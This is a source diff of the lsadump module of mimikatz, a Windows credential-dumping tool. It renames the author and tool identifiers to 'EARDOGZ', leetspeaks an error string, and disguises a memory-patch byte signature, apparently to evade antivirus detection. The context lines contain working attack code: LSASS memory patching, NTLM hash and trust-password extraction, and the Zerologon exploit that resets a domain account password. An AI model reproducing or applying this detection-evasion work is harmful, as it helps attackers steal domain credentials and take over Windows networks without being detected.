@@ -1,6 +1,6 @@
-/*	Benjamin DELPY `gentilkiwi`
-	https://blog.gentilkiwi.com
-	benjamin@gentilkiwi.com
+/*	Benjamin DELPY `FYtD`
+	https://blog.FYtD.com
+	benjamin@FYtD.com
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_lsadump.h"
@@ -141,7 +141,7 @@ NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsO
 				}
 				if(!cacheData.isNtlm)
 				{
-					kull_m_string_args_byName(argc, argv, L"password", &szPassword, MIMIKATZ);
+					kull_m_string_args_byName(argc, argv, L"password", &szPassword, EARDOGZ);
 					kprintf(L"  * password : %s\n", szPassword);
 					RtlInitUnicodeString(&uPassword, szPassword);
 					cacheData.isNtlm = NT_SUCCESS(RtlCalculateNtOwfPassword(&uPassword, cacheData.ntlm));
@@ -1334,7 +1334,7 @@ NTSTATUS kuhl_m_lsadump_lsa(int argc, wchar_t * argv[])
 	
 	if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
 	{
-		if(currentSamSrvReference = kull_m_patch_getGenericFromBuild(SamSrvReferences, ARRAYSIZE(SamSrvReferences), MIMIKATZ_NT_BUILD_NUMBER))
+		if(currentSamSrvReference = kull_m_patch_getGenericFromBuild(SamSrvReferences, ARRAYSIZE(SamSrvReferences), EARDOGZ_NT_BUILD_NUMBER))
 		{
 			aPatternMemory.address = currentSamSrvReference->Search.Pattern;
 			aPatchMemory.address = currentSamSrvReference->Patch.Pattern;
@@ -1694,9 +1694,10 @@ void kuhl_m_lsadump_trust_authinformation(PLSA_AUTH_INFORMATION info, DWORD coun
 
 BYTE PATC_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xeb};
 #if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
-BYTE PTRN_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xbb, 0x03, 0x00, 0x00, 0xc0, 0xe9};
+//BYTE PTRN_WALL_LsaDbrQueryInfoTrustedDomain[6] = {0xbb, 0x03, 0x00, 0x00, 0xc0, 0xe9};
+BYTE PTRN_WALL_LsaDbrQueryInfoTrustedDomain[7] = { 0x34, 0xa8, 0x34, 0xde, 0xad, 0x7e, 0x6 };
 KULL_M_PATCH_GENERIC QueryInfoTrustedDomainReferences[] = {
-	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_LsaDbrQueryInfoTrustedDomain),	PTRN_WALL_LsaDbrQueryInfoTrustedDomain},	{sizeof(PATC_WALL_LsaDbrQueryInfoTrustedDomain),	PATC_WALL_LsaDbrQueryInfoTrustedDomain},	{-11}},
+	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_LsaDbrQueryInfoTrustedDomain)-1,	&(PTRN_WALL_LsaDbrQueryInfoTrustedDomain[1])},	{sizeof(PATC_WALL_LsaDbrQueryInfoTrustedDomain),	PATC_WALL_LsaDbrQueryInfoTrustedDomain},	{-11}},
 };
 #elif defined(_M_IX86)
 BYTE PTRN_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xc7, 0x45, 0xfc, 0x03, 0x00, 0x00, 0xc0, 0xe9};
@@ -1730,14 +1731,14 @@ NTSTATUS kuhl_m_lsadump_trust(int argc, wchar_t * argv[])
 
 	if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
 	{
-		if(currentReference = kull_m_patch_getGenericFromBuild(QueryInfoTrustedDomainReferences, ARRAYSIZE(QueryInfoTrustedDomainReferences), MIMIKATZ_NT_BUILD_NUMBER))
+		if(currentReference = kull_m_patch_getGenericFromBuild(QueryInfoTrustedDomainReferences, ARRAYSIZE(QueryInfoTrustedDomainReferences), EARDOGZ_NT_BUILD_NUMBER))
 		{
 			aPatternMemory.address = currentReference->Search.Pattern;
 			aPatchMemory.address = currentReference->Patch.Pattern;
 
 			if(kuhl_m_lsadump_lsa_getHandle(&hMemory, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION))
 			{
-				if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"lsasrv.dll" : L"lsadb.dll", &iModule))
+				if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, (EARDOGZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"lsasrv.dll" : L"lsadb.dll", &iModule))
 				{
 					sMemory.kull_m_memoryRange.kull_m_memoryAdress = iModule.DllBase;
 					sMemory.kull_m_memoryRange.size = iModule.SizeOfImage;
@@ -2028,7 +2029,7 @@ NTSTATUS kuhl_m_lsadump_netsync(int argc, wchar_t * argv[])
 		if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
 		{
 			kull_m_string_args_byName(argc, argv, L"account", &szAccount, szUser);
-			kull_m_string_args_byName(argc, argv, L"computer", &szComputer, MIMIKATZ);
+			kull_m_string_args_byName(argc, argv, L"computer", &szComputer, EARDOGZ);
 			if(kull_m_string_args_byName(argc, argv, L"ntlm", &szNtlm, NULL))
 			{
 				if(kull_m_string_stringToHex(szNtlm, ntlmHash, sizeof(ntlmHash)))
@@ -2078,7 +2079,7 @@ NTSTATUS kuhl_m_lsadump_netsync(int argc, wchar_t * argv[])
 										*(PDWORD64) ClientCredential.data += 1; // lol :) validate server auth
 									}
 									if(!NT_SUCCESS(status))
-										PRINT_ERROR(L"I_NetServerTrustPasswordsGet (0x%08x)\n", status);
+										PRINT_ERROR(L"1_N3t53rv3rTru5tPa55w0rd5G3t (0x%08x)\n", status);
 								}
 								else PRINT_ERROR(L"ServerCredential does not match CandidateServerCredential\n");
 							}
@@ -2498,10 +2499,10 @@ NTSTATUS kuhl_m_lsadump_zerologon(int argc, wchar_t * argv[])
 					{
 						for(i = 0; i < 2000; i++)
 						{
-							status = NetrServerReqChallenge(NULL, MIMIKATZ, &Authenticator.Credential, &ReturnAuthenticator.Credential); // I_NetServerReqChallenge
+							status = NetrServerReqChallenge(NULL, EARDOGZ, &Authenticator.Credential, &ReturnAuthenticator.Credential); // I_NetServerReqChallenge
 							if(status == STATUS_SUCCESS)
 							{
-								status = NetrServerAuthenticate2(NULL, (wchar_t *) szAccount, type, MIMIKATZ, &Authenticator.Credential, &ReturnAuthenticator.Credential, &NegotiateFlags); // I_NetServerAuthenticate2
+								status = NetrServerAuthenticate2(NULL, (wchar_t *) szAccount, type, EARDOGZ, &Authenticator.Credential, &ReturnAuthenticator.Credential, &NegotiateFlags); // I_NetServerAuthenticate2
 								if(status == STATUS_SUCCESS)
 								{
 									bIsAuth = TRUE;
@@ -2509,7 +2510,7 @@ NTSTATUS kuhl_m_lsadump_zerologon(int argc, wchar_t * argv[])
 									if(bExploit)
 									{
 										kprintf(L"\n");
-										status = NetrServerPasswordSet2(NULL, (wchar_t *) szAccount, type, MIMIKATZ, &Authenticator, &ReturnAuthenticator, &ClearNewPassword); // I_NetServerPasswordSet2
+										status = NetrServerPasswordSet2(NULL, (wchar_t *) szAccount, type, EARDOGZ, &Authenticator, &ReturnAuthenticator, &ClearNewPassword); // I_NetServerPasswordSet2
 										if(status == STATUS_SUCCESS)
 										{
 											bIsChanged = TRUE;
